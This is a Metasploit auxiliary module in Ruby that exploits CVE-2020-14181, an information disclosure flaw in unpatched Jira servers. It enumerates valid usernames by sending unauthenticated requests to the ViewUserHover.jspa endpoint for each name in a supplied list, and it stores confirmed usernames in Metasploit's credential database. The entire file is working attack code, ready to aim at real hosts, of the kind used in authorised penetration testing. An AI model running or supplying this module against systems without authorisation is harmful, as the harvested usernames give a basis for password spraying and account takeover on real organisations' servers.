##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report



  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Jira Users Enumeration',
      'Description'    => %q{
        This module exploits an information disclosure vulnerability that allows an
        unauthenticated user to enumerate users in the /ViewUserHover.jspa endpoint.
        This only affects Jira versions < 7.13.16, 8.0.0 ≤ version < 8.5.7, 8.6.0 ≤ version < 8.12.0
        Discovered by Mikhail Klyuchnikov @__mn1__
        This module was only tested on 8.4.1
      },
      'Author'         => [ 'Brian Halbach' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://jira.atlassian.com/browse/JRASERVER-71560'],
          ['CVE', '2020-14181'],
        ],
      'DisclosureDate' => '2020-08-16'

    ))
    register_options(
      [
        #Opt::RPORT(443),
        #Opt::SSL(true),
        OptString.new('TARGETURI', [true, "Jira Path", "/"]),
        OptString.new('USERNAME', [ false, "Single username to test"]),
        OptPath.new('USER_FILE',
                    [false, 'File containing usernames, one per line'])
      ])
  end
  def base_uri
    @base_uri ||= normalize_uri("#{target_uri.path}/secure/ViewUserHover.jspa?username=")
  end

#I could not figure out how to add the usernames to the creds db so I copeid and pasted the following function from another program
  def report_cred(opts) 
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    # Test if password was passed, if so, add private_data. If not, assuming only username was found
    if opts.has_key?(:password)
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user],
        private_data: opts[:password],
        private_type: :password
      }.merge(service_data)
    else
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user]
      }.merge(service_data)
    end

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
    }.merge(service_data)

    create_credential_login(login_data)
  end
#I was having issues with handling the username vs user_file so I copied and pasted this function from another module to fix it
  def user_list
    users = []

    if datastore['USERNAME']
      users << datastore['USERNAME']
    elsif datastore['USER_FILE'] && File.readable?(datastore['USER_FILE'])
      users += File.read(datastore['USER_FILE']).split
    end

    users
  end

  def run_host(ip)
    # Main method
    #removed the check because it was not consistent 
    #unless check_host(ip) == Exploit::CheckCode::Appears
    #  print_error("#{ip} does not appear to be vulnerable, will not continue")
    #  return
    #end

    users=user_list
    if users.empty?
      print_error('Please populate USERNAME or USER_FILE')
      return
    end

    print_status("Begin enumerating users at #{vhost}#{base_uri.to_s}")

    user_list.each do |user|
      print_status("checking user #{user}")
    res = send_request_cgi!(
        'uri'     => "#{base_uri}#{user}",
        'method'  => 'GET',
        'headers' => { 'Connection' => 'Close' }
      )
    #print_status(res.body) was manually reading the response while troubleshooting
    if res.body.include?('User does not exist')
      print_bad("'User #{user} does not exist'")
    elsif res.body.include?('<a id="avatar-full-name-link"') #this works for 8.4.1 not sure about other verions
      print_good("'User exists: #{user}'")
      #use the report_creds function to add the username to the creds db
      report_cred(
          ip: res.peerinfo['addr'],
          port: datastore['RPORT'],
          service_name: 'jira',
          user: user
        )
    else
      print_error("No response")
    end
  end


  end

end
